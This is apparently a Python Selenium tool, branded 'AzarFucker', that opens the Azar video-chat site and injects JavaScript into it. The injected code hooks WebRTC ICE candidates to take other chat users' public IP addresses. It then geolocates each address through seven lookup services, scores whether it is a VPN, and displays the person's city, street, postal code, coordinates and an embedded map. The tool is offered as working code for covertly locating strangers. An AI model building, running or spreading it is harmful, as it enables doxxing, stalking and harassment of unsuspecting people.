from pystyle import Center, Colorate, Colors
import colorama
import os
from selenium import webdriver
import time
import sys

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))

colorama.init(autoreset=True)

def ErrorChoice():
    print(colorama.Fore.RED + "Invalid Choice.")
    return

def ErrorToken():
    print(colorama.Fore.RED + "Invalid Token.")
    return

def OnlyLinux():
    print(colorama.Fore.RED + "This feature is only available on Linux.")
    return

print("""
01 Chrome (Windows / Linux)
02 Edge (Windows)
03 Firefox (Windows)
""")

browser = input("Choose browser -> ")

driver = None

try:
    if browser in ['1', '01']:
        try:
            navigator = "Chrome"
            print(colorama.Fore.YELLOW + f"{navigator} Starting..")
            driver = webdriver.Chrome()
            print(colorama.Fore.GREEN + f"{navigator} Ready!")
        except:
            print(colorama.Fore.RED + f"{navigator} not installed or driver not up to date.")
            
    elif browser in ['2', '02']:
        if sys.platform.startswith("linux"):
            OnlyLinux()
        else:
            try:
                navigator = "Edge"
                print(colorama.Fore.YELLOW + f"{navigator} Starting..")
                driver = webdriver.Edge()
                print(colorama.Fore.GREEN + f"{navigator} Ready!")
            except:
                print(colorama.Fore.RED + f"{navigator} not installed or driver not up to date.")
                
    elif browser in ['3', '03']:
        if sys.platform.startswith("linux"):
            OnlyLinux()
        else:
            try:
                navigator = "Firefox"
                print(colorama.Fore.YELLOW + f"{navigator} Starting..")
                driver = webdriver.Firefox()
                print(colorama.Fore.GREEN + f"{navigator} Ready!")
            except:
                print(colorama.Fore.RED + f"{navigator} not installed or driver not up to date.")
    else:
        ErrorChoice()
    
    if driver:
        script = """
(function() {
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    overlay.style.zIndex = '10000';
    overlay.style.opacity = '0';
    overlay.style.animation = 'overlayFade 5s ease-in-out forwards';
    document.body.appendChild(overlay);

    const particlesContainer = document.createElement('div');
    particlesContainer.style.position = 'fixed';
    particlesContainer.style.top = '0';
    particlesContainer.style.left = '0';
    particlesContainer.style.width = '100%';
    particlesContainer.style.height = '100%';
    particlesContainer.style.zIndex = '10001';
    particlesContainer.style.opacity = '0';
    particlesContainer.style.animation = 'overlayFade 5s ease-in-out forwards';
    document.body.appendChild(particlesContainer);

    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.position = 'absolute';
        particle.style.width = '3px';
        particle.style.height = '3px';
        particle.style.background = '#00d6cc';
        particle.style.borderRadius = '50%';
        particle.style.left = Math.random() * 100 + 'vw';
        particle.style.top = Math.random() * 100 + 'vh';
        particle.style.animation = `particle ${2 + Math.random() * 2}s ease-in-out infinite`;
        particlesContainer.appendChild(particle);
    }

    const welcomeElement = document.createElement('div');
    welcomeElement.style.position = 'fixed';
    welcomeElement.style.top = '50%';
    welcomeElement.style.left = '50%';
    welcomeElement.style.transform = 'translate(-50%, -50%)';
    welcomeElement.style.zIndex = '10002';
    welcomeElement.style.textAlign = 'center';
    welcomeElement.innerHTML = `
        <div style="font-size: 40px; font-weight: bold; color: #ffffff;">Bienvenue sur AzarFucker</div>
        <div style="font-size: 20px; color: #00d6cc; margin-top: 10px;">by Ace</div>
    `;
    welcomeElement.style.fontFamily = 'Arial, sans-serif';
    welcomeElement.style.opacity = '0';
    welcomeElement.style.animation = 'welcomeFade 5s ease-in-out forwards';
    document.body.appendChild(welcomeElement);

    const welcomeStyle = document.createElement('style');
    welcomeStyle.textContent = `
        @keyframes overlayFade {
            0% { opacity: 0; }
            12% { opacity: 1; }
            88% { opacity: 1; }
            100% { opacity: 0; }
        }
        @keyframes welcomeFade {
            0% {
                opacity: 0;
                transform: translate(-50%, -50%) scale(0.9);
            }
            12% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1);
            }
            88% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(1);
            }
            100% {
                opacity: 0;
                transform: translate(-50%, -50%) scale(1.1);
            }
        }
        @keyframes particle {
            0% {
                transform: translate(0, 0) scale(1);
                opacity: 0;
            }
            50% {
                opacity: 0.8;
            }
            100% {
                transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) scale(0);
                opacity: 0;
            }
        }
    `;
    document.head.appendChild(welcomeStyle);

    setTimeout(() => {
        document.body.removeChild(welcomeElement);
        document.body.removeChild(overlay);
        document.body.removeChild(particlesContainer);
    }, 5000);

    const ipContainer = document.createElement('div');
    ipContainer.id = 'ip-container';
    ipContainer.style.position = 'fixed';
    ipContainer.style.top = '10px';
    ipContainer.style.right = '10px';
    ipContainer.style.width = '400px';
    ipContainer.style.maxHeight = '500px';
    ipContainer.style.overflowY = 'auto';
    ipContainer.style.backgroundColor = '#1a1a1a';
    ipContainer.style.border = '1px solid #333';
    ipContainer.style.borderRadius = '12px';
    ipContainer.style.padding = '20px';
    ipContainer.style.zIndex = '10000';
    ipContainer.style.fontFamily = 'Arial, sans-serif';
    ipContainer.style.fontSize = '14px';
    ipContainer.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.1)';
    ipContainer.style.color = '#ffffff';
    ipContainer.style.resize = 'both';
    ipContainer.style.overflow = 'auto';
    ipContainer.style.animation = 'slideIn 0.5s ease-out';
    ipContainer.style.opacity = '0';
    ipContainer.innerHTML = `
        <div id="drag-handle" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; cursor: move;">
            <div style="display: flex; align-items: center;">
                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMwMGQ2Y2MiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBjbGFzcz0ibHVjaWRlIGx1Y2lkZS1zZWFyY2giPjxjaXJjbGUgY3g9IjExIiBjeT0iMTEiIHI9IjgiPjwvY2lyY2xlPjxwYXRoIGQ9Im0yMSAyMS00LjMtNC4zIj48L3BhdGg+PC9zdmc+" style="width: 24px; height: 24px; margin-right: 10px;" alt="Search Logo">
                <h3 style="margin: 0; color: #ffffff;">AzarFucker</h3>
            </div>
            <div>
                <button id="clear-ip-list" style="padding: 8px 15px; border: none; background-color: #2c2c2c; color: white; border-radius: 8px; cursor: pointer; transition: all 0.3s; margin-right: 5px;">Clear</button>
                <button id="minimize-ip-container" style="padding: 8px 15px; border: none; background-color: #2c2c2c; color: white; border-radius: 8px; cursor: pointer; transition: all 0.3s; margin-right: 5px;">-</button>
                <button id="close-ip-container" style="padding: 8px 15px; border: none; background-color: #2c2c2c; color: white; border-radius: 8px; cursor: pointer; transition: all 0.3s;">X</button>
            </div>
        </div>
        <div id="ip-content" style="transition: all 0.3s ease;">
            <div id="ip-addresses"></div>
            <div style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
                <a href="https://guns.lol/shootgun" target="_blank" style="flex: 1; text-align: center; background-color: #2c2c2c; color: white; padding: 10px; text-decoration: none; font-weight: bold; border-radius: 8px; transition: all 0.3s;">About Me</a>
                <div style="text-align: center; font-size: 10px; color: #666; margin-top: 5px;">Base by X2K</div>
            </div>
        </div>
    `;
    document.body.appendChild(ipContainer);

    
    document.getElementById('clear-ip-list').addEventListener('click', () => {
        const ipList = document.getElementById('ip-addresses');
        ipList.innerHTML = '';
    });

    
    document.getElementById('close-ip-container').addEventListener('click', () => {
        document.body.removeChild(ipContainer);
    });

    
    function makeDraggable(element, handle) {
        handle = handle || element;
        let posX = 0, posY = 0, mouseX = 0, mouseY = 0;

        handle.onmousedown = dragMouseDown;

        function dragMouseDown(e) {
            e.preventDefault();
            mouseX = e.clientX;
            mouseY = e.clientY;
            document.onmouseup = closeDragElement;
            document.onmousemove = elementDrag;
        }

        function elementDrag(e) {
            e.preventDefault();
            posX = mouseX - e.clientX;
            posY = mouseY - e.clientY;
            mouseX = e.clientX;
            mouseY = e.clientY;
            element.style.top = (element.offsetTop - posY) + "px";
            element.style.left = (element.offsetLeft - posX) + "px";
        }

        function closeDragElement() {
            document.onmouseup = null;
            document.onmousemove = null;
        }
    }

    makeDraggable(ipContainer, document.getElementById('drag-handle'));

    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

    window.RTCPeerConnection = function(...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function(iceCandidate, ...rest) {
            const fields = iceCandidate.candidate.split(' ');

            if (fields[7] === 'srflx') {
                const ipAddress = fields[4];
                const currentTime = new Date().toLocaleTimeString();

                async function verifyIP(ip) {
                    const services = [
                        `https://ipapi.co/${ip}/json/`,
                        `https://ipwhois.app/json/${ip}`,
                        `https://ip-api.com/json/${ip}?fields=66846719`,
                        `https://extreme-ip-lookup.com/json/${ip}`,
                        `https://ipwho.is/${ip}`,
                        `https://freeipapi.com/api/json/${ip}`,
                        `https://ipapi.is/${ip}/json`
                    ];

                    try {
                        const responses = await Promise.all(services.map(url => 
                            fetch(url)
                            .then(res => res.json())
                            .catch(() => ({}))
                        ));

                        const isValidCoordinate = (coord) => {
                            const num = parseFloat(coord);
                            return !isNaN(num) && Math.abs(num) <= 180 && num !== 0;
                        };

                        let bestCoordinates = { latitude: '0', longitude: '0', accuracy: 'Unknown' };
                        for (let response of responses) {
                            let lat = response.lat || response.latitude;
                            let lon = response.lon || response.longitude;
                            
                            if (response.loc) {
                                [lat, lon] = response.loc.split(',');
                            }

                            if (isValidCoordinate(lat) && isValidCoordinate(lon)) {
                                bestCoordinates = {
                                    latitude: lat,
                                    longitude: lon,
                                    accuracy: response.accuracy_radius || 'High'
                                };
                                if (response.accuracy_radius && response.accuracy_radius < 100) {
                                    break;
                                }
                            }
                        }

                        const getBestValue = (key, sources, alternateKeys = []) => {
                            let values = [];
                            for (let source of sources) {
                                if (source && source[key] && source[key] !== 'Unknown' && source[key] !== '') {
                                    values.push(source[key]);
                                }
                                for (let altKey of alternateKeys) {
                                    if (source && source[altKey] && source[altKey] !== 'Unknown' && source[altKey] !== '') {
                                        values.push(source[altKey]);
                                    }
                                }
                            }
                            if (values.length > 0) {
                                const counts = values.reduce((acc, val) => {
                                    acc[val] = (acc[val] || 0) + 1;
                                    return acc;
                                }, {});
                                return Object.entries(counts).sort((a, b) => b[1] - a[1])[0][0];
                            }
                            return 'Unknown';
                        };

                        let locationDetails = {
                            continent: getBestValue('continent', responses, ['continent_name', 'location.continent']),
                            country: getBestValue('country', responses, ['country_name', 'location.country', 'countryCode']),
                            region: getBestValue('regionName', responses, ['region', 'location.region', 'subdivision', 'state']),
                            city: getBestValue('city', responses, ['cityName', 'location.city', 'municipality']),
                            district: getBestValue('district', responses, ['subdivision', 'location.district', 'area', 'neighborhood']),
                            street: getBestValue('street', responses, ['road', 'location.street', 'address', 'street_name']),
                            postal: getBestValue('zip', responses, ['postal', 'location.postal', 'postal_code', 'postcode']),
                            coordinates: bestCoordinates
                        };

                        const checkVPN = (responses) => {
                            let vpnIndicators = {
                                isVPN: false,
                                proxyType: 'None',
                                confidence: 0,
                                details: []
                            };

                            responses.forEach(r => {
                                if (r.proxy || r.security?.proxy || r.hosting || r.type === 'hosting') {
                                    vpnIndicators.confidence += 25;
                                    vpnIndicators.details.push('Direct proxy/VPN detection');
                                }

                                if (r.connection_type === 'Corporate' || r.connection_type === 'Hosting') {
                                    vpnIndicators.confidence += 15;
                                    vpnIndicators.details.push('Suspicious connection type');
                                }

                                const suspiciousHosts = ['Amazon', 'Digital Ocean', 'OVH', 'Cloudflare', 'Google Cloud', 'Microsoft Azure'];
                                if (r.org && suspiciousHosts.some(host => r.org.includes(host))) {
                                    vpnIndicators.confidence += 20;
                                    vpnIndicators.details.push('Hosting provider detected');
                                }

                                if (r.port && (r.port === '1080' || r.port === '8080' || r.port === '3128')) {
                                    vpnIndicators.confidence += 30;
                                    vpnIndicators.details.push('Proxy port detected');
                                }

                                if (r.datacenter || r.hosting || r.server) {
                                    vpnIndicators.confidence += 20;
                                    vpnIndicators.details.push('Datacenter IP detected');
                                }

                                if (r.network_type === 'VPN' || r.connection_type === 'VPN') {
                                    vpnIndicators.confidence += 35;
                                    vpnIndicators.details.push('VPN network type');
                                }

                                const vpnASNs = ['AS9009', 'AS12876', 'AS16276', 'AS29119', 'AS49981'];
                                if (r.asn && vpnASNs.includes(r.asn)) {
                                    vpnIndicators.confidence += 25;
                                    vpnIndicators.details.push('Known VPN ASN');
                                }

                                if (r.datacenter_range || r.hosting_range) {
                                    vpnIndicators.confidence += 15;
                                    vpnIndicators.details.push('Datacenter IP range');
                                }
                            });

                            if (vpnIndicators.confidence >= 60) {
                                vpnIndicators.isVPN = true;
                                if (vpnIndicators.confidence >= 80) {
                                    vpnIndicators.proxyType = 'VPN (High Confidence)';
                                } else {
                                    vpnIndicators.proxyType = 'Probable VPN/Proxy';
                                }
                            } else if (vpnIndicators.confidence >= 30) {
                                vpnIndicators.isVPN = true;
                                vpnIndicators.proxyType = 'Possible VPN/Proxy';
                            }

                            return vpnIndicators;
                        };

                        const vpnCheck = checkVPN(responses);

                        let risk = vpnCheck.isVPN ? 'high' : 'low';

                        return {
                            isp: getBestValue('org', [responses[0], responses[1]]) || getBestValue('isp', [responses[2]]),
                            city: locationDetails.city,
                            country: locationDetails.country,
                            region: locationDetails.region,
                            postal: locationDetails.postal,
                            timezone: getBestValue('timezone', responses),
                            latitude: locationDetails.coordinates.latitude,
                            longitude: locationDetails.coordinates.longitude,
                            vpn: vpnCheck.isVPN,
                            risk: risk,
                            connection: {
                                type: getBestValue('type', responses) || 'Unknown',
                                asn: getBestValue('asn', responses) || 'Unknown',
                                org: getBestValue('org', responses) || 'Unknown'
                            },
                            currency: getBestValue('currency', responses) || 'Unknown',
                            calling_code: getBestValue('country_calling_code', [responses[0]]) || getBestValue('calling_code', responses) || 'Unknown',
                            location: {
                                city: locationDetails.city,
                                district: locationDetails.district,
                                street: locationDetails.street,
                                region: locationDetails.region,
                                country: locationDetails.country,
                                continent: locationDetails.continent,
                                postal: locationDetails.postal,
                                coordinates: {
                                    latitude: locationDetails.coordinates.latitude,
                                    longitude: locationDetails.coordinates.longitude,
                                    accuracy: locationDetails.coordinates.accuracy
                                }
                            },
                            security: {
                                isVPN: vpnCheck.isVPN,
                                proxyType: vpnCheck.proxyType,
                                confidence: vpnCheck.confidence,
                                details: vpnCheck.details
                            }
                        };
                    } catch (error) {
                        console.error('Error verifying IP:', error);
                        return {
                            isp: 'Unknown ISP',
                            city: 'Unknown City',
                            country: 'Unknown Country',
                            region: 'Unknown Region',
                            postal: 'Unknown Postal',
                            timezone: 'Unknown Timezone',
                            latitude: '0',
                            longitude: '0',
                            vpn: false,
                            risk: 'unknown',
                            connection: {
                                type: 'Unknown',
                                asn: 'Unknown',
                                org: 'Unknown'
                            },
                            currency: 'Unknown',
                            calling_code: 'Unknown',
                            location: {
                                city: 'Unknown City',
                                district: 'Unknown District',
                                street: 'Unknown Street',
                                region: 'Unknown Region',
                                country: 'Unknown Country',
                                continent: 'Unknown Continent',
                                postal: 'Unknown Postal',
                                coordinates: {
                                    latitude: '0',
                                    longitude: '0',
                                    accuracy: 'Unknown'
                                }
                            },
                            security: {
                                isVPN: false,
                                proxyType: 'None',
                                confidence: 0,
                                details: []
                            }
                        };
                    }
                }

                verifyIP(ipAddress).then(data => {
                    const ipList = document.getElementById('ip-addresses');
                    const ipItem = document.createElement('div');
                    ipItem.className = 'ip-item';
                    ipItem.style.display = 'flex';
                    ipItem.style.flexDirection = 'column';
                    ipItem.style.backgroundColor = '#2c2c2c';
                    ipItem.style.border = '1px solid #444';
                    ipItem.style.padding = '15px';
                    ipItem.style.marginBottom = '10px';
                    ipItem.style.borderRadius = '8px';
                    ipItem.style.boxShadow = '0 2px 4px rgba(0, 0, 0, 0.2)';
                    ipItem.style.transition = 'all 0.2s';

                    const mapUrl = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=13&output=embed`;
                    
                    ipItem.innerHTML = `
                        <div style="display: flex; justify-content: space-between;">
                            <div style="flex: 1;">
                                <div style="border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 10px;">
                                    <h4 style="color: #00d6cc; margin: 0 0 10px 0;">Basic Information</h4>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Time:</strong> ${currentTime}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>IP:</strong> ${ipAddress}</div>
                                    <div style="color: ${data.vpn ? '#ff4444' : '#44ff44'}; margin: 5px 0;"><strong>Status:</strong> ${data.security.proxyType}</div>
                                    <div style="color: ${data.risk === 'high' ? '#ff4444' : '#44ff44'}; margin: 5px 0;"><strong>Risk Level:</strong> ${data.risk.toUpperCase()}</div>
                                </div>

                                <div style="border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 10px;">
                                    <h4 style="color: #00d6cc; margin: 0 0 10px 0;">Location Details</h4>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Continent:</strong> ${data.location.continent}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Country:</strong> ${data.location.country}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Region:</strong> ${data.location.region}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>City:</strong> ${data.location.city}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>District:</strong> ${data.location.district}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Street:</strong> ${data.location.street}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Postal Code:</strong> ${data.location.postal}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Coordinates:</strong> ${data.location.coordinates.latitude}, ${data.location.coordinates.longitude}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Location Accuracy:</strong> ${data.location.coordinates.accuracy}</div>
                                </div>

                                <div style="border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 10px;">
                                    <h4 style="color: #00d6cc; margin: 0 0 10px 0;">Network Information</h4>
                                    <div style="color: #fff; margin: 5px 0;"><strong>ISP:</strong> ${data.isp}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Connection Type:</strong> ${data.connection.type}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Speed:</strong> ${data.connection.speed}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>ASN:</strong> ${data.connection.asn}</div>
                                </div>

                                <div style="border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 10px;">
                                    <h4 style="color: #00d6cc; margin: 0 0 10px 0;">Additional Information</h4>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Timezone:</strong> ${data.timezone}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Currency:</strong> ${data.currency}</div>
                                    <div style="color: #fff; margin: 5px 0;"><strong>Calling Code:</strong> +${data.calling_code}</div>
                                </div>

                                <div style="border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 10px;">
                                    <h4 style="color: #00d6cc; margin: 0 0 10px 0;">Security Analysis</h4>
                                    <div style="color: ${data.vpn ? '#ff4444' : '#44ff44'}; margin: 5px 0;">
                                        <strong>Status:</strong> ${data.security.proxyType}
                                    </div>
                                    <div style="color: #fff; margin: 5px 0;">
                                        <strong>Confidence:</strong> ${data.security.confidence}%
                                    </div>
                                    <div style="color: #fff; margin: 5px 0;">
                                        <strong>Detection Details:</strong>
                                        <ul style="margin: 5px 0; padding-left: 20px;">
                                            ${data.security.details.map(detail => `<li>${detail}</li>`).join('')}
                                        </ul>
                                    </div>
                                </div>

                                <button style="width: 100%; padding: 10px; border: none; background-color: #444; color: white; border-radius: 8px; cursor: pointer; transition: all 0.3s; margin-top: 10px;">Copy IP</button>
                            </div>
                            <div style="flex: 1; margin-left: 15px;">
                                <iframe 
                                    width="100%" 
                                    height="100%" 
                                    frameborder="0" 
                                    style="border-radius: 8px; min-height: 400px;" 
                                    src="${mapUrl}" 
                                    allowfullscreen>
                                </iframe>
                            </div>
                        </div>
                    `;
                    ipList.appendChild(ipItem);

                    
                    const copyButton = ipItem.querySelector('button');
                    copyButton.addEventListener('click', () => {
                        navigator.clipboard.writeText(ipAddress).then(() => {
                            copyButton.textContent = 'Succes!';
                            copyButton.style.backgroundColor = '#00d6cc';
                            setTimeout(() => {
                                copyButton.textContent = 'Copy';
                                copyButton.style.backgroundColor = '#444';
                            }, 2000);
                        });
                    });
                });
            }

            return pc.oaddIceCandidate(iceCandidate, ...rest);
        }

        return pc;
    }

    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            0% {
                transform: translateY(-20px);
                opacity: 0;
            }
            100% {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .ip-item {
            animation: fadeIn 0.5s ease-out;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
    `;
    document.head.appendChild(style);

    setTimeout(() => {
        ipContainer.style.opacity = '1';
    }, 100);

    let isMinimized = false;
    const minimizeButton = document.getElementById('minimize-ip-container');
    const ipContent = document.getElementById('ip-content');
    const originalHeight = ipContainer.style.height;

    minimizeButton.addEventListener('click', () => {
        isMinimized = !isMinimized;
        if (isMinimized) {
            ipContent.style.display = 'none';
            ipContainer.style.height = 'auto';
            minimizeButton.textContent = '□';
            minimizeButton.style.transform = 'rotate(180deg)';
        } else {
            ipContent.style.display = 'block';
            ipContainer.style.height = originalHeight;
            minimizeButton.textContent = '-';
            minimizeButton.style.transform = 'rotate(0deg)';
        }
    });
})();
        """

        driver.get("https://azarlive.com")
        print(colorama.Fore.YELLOW + "Inject..")
        driver.execute_script(script)
        time.sleep(4)
        print(colorama.Fore.GREEN + "Connected Token!")
        print(colorama.Fore.YELLOW + "If you leave the tool, the browser will stay open!")

except Exception as e:
    print(colorama.Fore.RED + f"Error: {e}")

while True:
    time.sleep(1)